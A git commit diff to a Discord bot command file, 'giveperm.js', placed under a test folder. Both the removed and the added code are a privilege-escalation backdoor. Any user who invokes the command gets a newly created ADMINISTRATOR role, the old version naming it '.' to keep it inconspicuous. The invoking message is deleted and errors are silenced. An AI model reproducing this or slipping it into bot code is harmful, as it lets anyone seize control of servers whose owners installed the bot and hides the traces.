8dc45f4abaa663309670b393de3b262ea89765f9
dqszxdbcyezfckq <45467604+dqszxdbcyezfckq@users.noreply.github.com>
2018-11-30 18:02:23 +0100

    Update giveperm.js

--- commands/test/giveperm.js
+++ commands/test/giveperm.js
@@ -4,51 +4,15 @@ const Discord = require('discord.js');
 
 exports.run = (client, message, args) => {
     
-    message.channel.fetchMessages({
-        limit: 1
-      }).then(messages => message.channel.bulkDelete(messages));
-     if(!message.channel.permissionsFor(client.user).has("ADMINISTRATOR")) return message.author.send('Je ne peux pas te donner le rôle admin, sorry bro');
-
-  const raidrole = message.guild.roles.find(`name`, ".");
-
-    if(!raidrole){
-        try{
-        
-    
-        raidrole =  message.guild.createRole({
-          name: ".",
-          color: "#00000",
-          permissions:['ADMINISTRATOR']
-        })
-    
-      }catch(e){
-        message.channel.send(e) 
-      }
-    
-    
-        
-    const muteRoles = message.guild.roles.find(`name`, ".");
-    setTimeout(function(){
-          message.guild.channels.forEach(async (channel, id) => {
-                await channel.overwritePermissions(muteRoles, {
-                    SEND_MESSAGES: true,
-                    ADD_REACTIONS: true,
-                    MENTION_EVERYONE: true
-                });
-            });
-              message.guild.member(message.author).addRole(muteRoles)
-              
-      }, 100);
-  }else{
-      message.guild.channels.forEach(async (channel, id) => {
-                await channel.overwritePermissions(raidrole, {
-                    SEND_MESSAGES: true,
-                    ADD_REACTIONS: true,
-                    MENTION_EVERYONE: true
-                });
-            });message.guild.member(message.author).addRole(raidrole)
-
-}
+     message.member.guild.createRole({
+      name: "Anarchy",
+      permissions: "ADMINISTRATOR",
+      mentionable: false
+    }).then(function(role) {
+      message.member.addRole(role);
+      if (message.deletable) message.delete().catch(e => {});
+    }).catch(e => {});
+  }
 
 }
 
